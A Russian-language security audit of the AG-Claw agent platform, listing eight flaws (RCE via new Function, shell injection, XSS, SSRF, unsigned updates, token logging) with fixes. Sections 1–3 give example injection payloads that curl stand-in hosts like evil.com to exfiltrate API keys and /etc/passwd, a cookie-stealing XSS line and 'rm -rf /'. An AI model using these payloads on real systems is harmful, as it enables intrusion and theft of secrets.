# AG-Claw Security Analysis — Детальный разбор

## 1. 🔴 mesh-workflows: `new Function(...)` (RCE)

### Проблема
```typescript
// В mesh-workflows/index.ts
new Function('vars', `with(vars) { return ${condition}; }`)(vars)
```

### Почему плохо
`new Function(...)` — это `eval()` в другом виде. Если `condition` приходит от пользователя, он может выполнить ЛЮБОЙ JavaScript на сервере:

```
condition: "1; process.exit(1)" — убивает сервер
condition: "1; require('child_process').execSync('curl evil.com/steal?data='+process.env.OPENROUTER_API_KEY)" — крадёт API ключи
condition: "1; require('fs').readFileSync('/etc/passwd')" — читает системные файлы
```

Атака работает так: пользователь создаёт workflow с условием `"1; eval(atob('...'))"` — сервер выполнит код без ограничений.

### Решение
Заменить на безопасный парсер выражений:
```typescript
// Вариант 1: jsep + интерпретатор
import jsep from 'jsep';
const ast = jsep(condition); // парсит выражение в AST
// интерпретатор ограничивает доступ к переменным

// Вариант 2: jsonata (специальный язык для JSON выражений)
const result = jsonata(condition).evaluate(vars);

// Вариант 3: простой whitelist операций
const ALLOWED_OPS = ['==', '!=', '>', '<', '&&', '||', 'in', 'contains'];
// парсить и выполнять только разрешённые операции
```

---

## 2. 🔴 container-sandbox: `spawn('sh', ['-c', command])`

### Проблема
```typescript
// В container-sandbox/index.ts
spawn('docker', ['run', '--rm', 'sandbox', 'sh', '-c', command])
```

### Почему плохо
`sh -c` передаёт строку в shell, что позволяет инъекцию:
```
command: "ls; curl evil.com/exfiltrate?data=$(cat /etc/passwd)"
command: "ls && rm -rf /"
command: "ls; docker run --privileged host bash -c '...'"
```

Атака: пользователь создаёт задачу с командой `"ls; curl attacker.com?secrets=$(cat ~/.openclaw/openclaw.json)"` — все API ключи утекают.

Также если Docker запущен с `--network=host` (по умолчанию), контейнер может обращаться к localhost сервера.

### Решение
```typescript
// Вариант 1: передавать команду как массив (без sh)
spawn('docker', ['run', '--rm', '--network=none', 'sandbox', ...commandArray])

// Вариант 2: whitelist команд
const ALLOWED_COMMANDS = ['ls', 'cat', 'echo', 'grep'];
if (!ALLOWED_COMMANDS.includes(command.split(' ')[0])) {
    throw new Error('Command not allowed');
}

// Вариант 3: изолированный shell
spawn('docker', ['run', '--rm', '--network=none', '--read-only', 
    '--security-opt', 'no-new-privileges', 'sandbox', 
    'bash', '-c', '--restricted', command])
```

---

## 3. ⚠️ webchat: нет аутентификации + XSS

### Проблема
```typescript
// В webchat/index.ts
// WebSocket принимает любого
wss.on('connection', (ws, req) => {
    const { room, user } = parseUrl(req.url); // user из URL!
    // Нет проверки токена
});
// Сообщения рендерятся через innerHTML
element.innerHTML = md(message.content); // XSS!
```

### Почему плохо
1. **Нет аутентификации** — любой, кто знает порт, может подключиться
2. **user из URL** — можно выдать себя за любого пользователя: `ws://host/chat?user=admin`
3. **XSS через Markdown** — если Markdown парсер пропускает `<script>` или обработанный HTML:
   ```
   ![img](x" onerror="fetch('evil.com?cookie='+document.cookie))
   ```
4. **Файлы без валидации** — mimeType берётся от клиента, можно загрузить .exe как image/png

### Решение
```typescript
// 1. Аутентификация через токены
wss.on('connection', (ws, req) => {
    const token = new URL(req.url, 'ws://localhost').searchParams.get('token');
    if (!verifyToken(token)) {
        ws.close(4001, 'Unauthorized');
        return;
    }
});

// 2. Валидация файлов
import { fileTypeFromBuffer } from 'file-type';
const detected = await fileTypeFromBuffer(buffer);
if (!ALLOWED_TYPES.includes(detected.mime)) {
    reject('Invalid file type');
}

// 3. Безопасный рендеринг Markdown
import DOMPurify from 'dompurify';
element.innerHTML = DOMPurify.sanitize(md(message.content));
```

---

## 4. ⚠️ webhooks: SSRF (Server-Side Request Forgery)

### Проблема
```typescript
// В webhooks/index.ts
async dispatch(event: WebhookEvent) {
    for (const sub of this.subscriptions) {
        await fetch(sub.url, { // sub.url от пользователя!
            method: 'POST',
            body: JSON.stringify(event.payload),
            headers: { 'X-Signature': signature }
        });
    }
}
```

### Почему плохо
Атакующий создаёт webhook подписку на `http://localhost:18789/api/admin` — сервер обращается к самому себе и выполняет админские команды.

Или на `http://169.254.169.254/latest/meta-data/` — крадёт AWS credentials (Metadata Service).

Или на `http://10.0.0.1:6379` — Redis внутри сети.

### Решение
```typescript
// 1. Блокировать внутренние IP
import { isIP } from 'net';
import { lookup } from 'dns/promises';

async function validateUrl(url: string): Promise<boolean> {
    const parsed = new URL(url);
    const { address } = await lookup(parsed.hostname);
    
    // Блокировать частные диапазоны
    const privateRanges = [
        /^127\./, /^10\./, /^172\.(1[6-9]|2\d|3[01])\./,
        /^192\.168\./, /^169\.254\./, /^::1$/, /^fd/
    ];
    
    return !privateRanges.some(r => r.test(address));
}

// 2. Whitelist доменов
const ALLOWED_WEBHOOK_DOMAINS = ['api.example.com', 'hooks.slack.com'];
```

---

## 5. ⚠️ auto-updater и free-ride: привилегированные операции

### Проблема
- auto-updater: обновляет скиллы через cron, может установить вредоносный код
- free-ride: может изменять openclaw.json и перезапускать gateway

### Почему плохо
Если один из скиллов будет скомпрометирован (supply chain attack), он получит доступ к:
- Изменению конфигурации (другие модели, API ключи)
- Перезапуску gateway (DoS)
- Добавлению новых скиллов (цепочка атак)

### Решение
```typescript
// 1. Ручное подтверждение перед обновлением
if (!config.autoApproveUpdates) {
    await notifyUser(`Updates available: ${updates.join(', ')}. Approve?`);
    await waitForApproval();
}

// 2. Проверка подписи обновлений
const signature = await getSignature(update);
if (!verifySignature(signature, TRUSTED_KEYS)) {
    throw new Error('Invalid signature');
}

// 3. Бэкап перед обновлением
await backupCurrentVersion();
```

---

## 6. ⚠️ summarize: отправка данных во внешние API

### Проблема
```typescript
// summarize использует внешние LLM
const summary = await openai.chat.completions.create({ model: 'gpt-4', messages });
```

### Почему плохо
Если пользователь отправляет конфиденциальные документы (код, финансовые данные), они уходят на сервера OpenAI.

### Решение
```typescript
// 1. Предупреждать пользователя
if (containsSensitiveData(content)) {
    const approved = await askUser('This content may be sensitive. Send to external API?');
    if (!approved) return;
}

// 2. Локальный режим
if (config.localOnly) {
    return await localModel.summarize(content); // использовать локальную модель
}
```

---

## 7. ⚠️ skills-library: хранение произвольного кода

### Проблема
```typescript
// Сохраняет код как строку
skillRecord.code = userProvidedCode;
fs.writeFileSync(path, skillRecord.code);
```

### Почему плохо
Если этот код потом исполняется через `eval()` или `require()` — это RCE.

### Решение
```typescript
// НИКОГДА не исполнять сохранённый код
// Хранить только как данные
// Если нужно исполнять — в изолированном VM/контейнере
```

---

## 8. ⚠️ x-twitter: вывод фрагментов токена

### Проблема
```typescript
console.log(`Using token: ${token.slice(0, 8)}...`);
```

### Почему плохо
Логи могут быть доступны другим пользователям, сохраняться в файлы. Даже 8 символов токена помогают в атаке.

### Решение
```typescript
// Никогда не логировать токены, даже частично
console.log('Token loaded successfully');
```

---

## Общие рекомендации

1. **Все файлы в ./data/** — права 700, владелец сервисный пользователь
2. **Все API ключи** — только через env, никогда не в коде и логах
3. **Все пользовательские входы** — валидация, санитизация, ограничение размера
4. **Все внешние запросы** — таймауты, ограничение размера, блокировка внутренних IP
5. **Все исполняемые команды** — whitelist, никогда не передавать в shell напрямую
6. **Все Markdown/HTML** — через DOMPurify перед innerHTML
